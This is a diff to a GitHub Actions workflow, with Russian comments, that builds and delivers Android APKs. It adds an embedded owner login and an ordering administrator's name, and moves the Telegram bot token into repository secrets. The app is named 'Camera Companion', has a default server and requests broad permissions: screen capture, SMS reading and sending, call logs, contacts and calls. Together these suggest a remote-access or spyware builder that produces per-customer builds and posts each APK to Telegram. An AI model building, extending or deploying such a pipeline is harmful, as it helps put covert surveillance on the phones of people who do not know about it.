@@ -28,12 +28,12 @@ on:
         description: "Список разрешений через запятую: CAMERA,RECORD_AUDIO,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN,LOCATION,MEDIA_IMAGES,MEDIA_VIDEO,CALENDAR"
         required: false
         default: "CAMERA,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN"
-      tg_token:
-        description: "Telegram Bot Token (APK отправится в Telegram после сборки)"
+      owner_username:
+        description: "Логин владельца APK (зашивается в приложение)"
         required: false
         default: ""
-      tg_chat_id:
-        description: "Telegram Chat ID"
+      requested_by:
+        description: "Кто заказал APK (логин администратора)"
         required: false
         default: ""
 
@@ -70,10 +70,13 @@ jobs:
           SERVER="${{ github.event.inputs.default_server }}"
           PERMS="${{ github.event.inputs.permissions || 'CAMERA,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN' }}"
 
+          OWNER="${{ github.event.inputs.owner_username }}"
+
           cat > build.properties.generated <<EOF
           ARP_APP_NAME=${APP_NAME}
           ARP_APPLICATION_ID=${APP_ID}
           ARP_DEFAULT_SERVER=${SERVER}
+          ARP_OWNER_USERNAME=${OWNER}
           EOF
 
           # Проверка наличия разрешения в списке
@@ -135,16 +138,21 @@ jobs:
           if-no-files-found: error
 
       - name: Send APK to Telegram
-        if: ${{ github.event.inputs.tg_token != '' && github.event.inputs.tg_chat_id != '' }}
+        if: ${{ secrets.TG_BOT_TOKEN != '' }}
         env:
-          TG_TOKEN: ${{ github.event.inputs.tg_token }}
-          TG_CHAT_ID: ${{ github.event.inputs.tg_chat_id }}
+          TG_TOKEN: ${{ secrets.TG_BOT_TOKEN }}
+          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
           APP_NAME: ${{ github.event.inputs.app_name || 'Camera Companion' }}
+          OWNER: ${{ github.event.inputs.owner_username }}
+          REQUESTED_BY: ${{ github.event.inputs.requested_by }}
         run: |
           APK="app/build/outputs/apk/debug/app-debug.apk"
+          CAPTION="📦 APK готов!"
+          [ -n "$OWNER" ] && CAPTION="$CAPTION%0AВладелец: $OWNER"
+          [ -n "$REQUESTED_BY" ] && CAPTION="$CAPTION%0AСоздал: $REQUESTED_BY"
           curl -s \
             -F "chat_id=${TG_CHAT_ID}" \
-            -F "document=@${APK};filename=${APP_NAME}.apk" \
-            -F "caption=✅ ${APP_NAME} — APK готов, устанавливай!" \
+            -F "document=@${APK};filename=${APP_NAME:-companion}.apk" \
+            -F "caption=${CAPTION}" \
             "https://api.telegram.org/bot${TG_TOKEN}/sendDocument" \
-            | grep -q '"ok":true' && echo "Telegram: sent" || echo "Telegram: send failed (check token/chat_id)"
+            | grep -q '"ok":true' && echo "Telegram: sent" || echo "Telegram: send failed"
